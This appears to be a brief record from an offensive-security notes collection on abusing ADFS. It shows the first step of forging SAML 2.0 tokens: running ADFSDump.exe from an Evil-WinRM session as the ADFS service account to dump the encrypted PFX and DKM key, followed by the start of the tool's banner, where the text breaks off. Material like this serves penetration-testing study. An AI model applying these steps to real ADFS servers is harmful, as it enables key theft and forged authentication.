item.title: ADFS
item.description: Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> .\ADFSDump.exe ___ ____ ___________ ____ / | / __ \/ ____/ ___// __ \__ ______ ___ ____ / /| | / / / / /_ \__ \/ / / / / / / __ `__ \/ __ \ / ___ |/ /_/ / __/ ___/ / /_/ / /_/ / / / / / / /_/ / /_/ |_/_____/_/ /____/_____/\__,_/_/ /_/ /_/ .
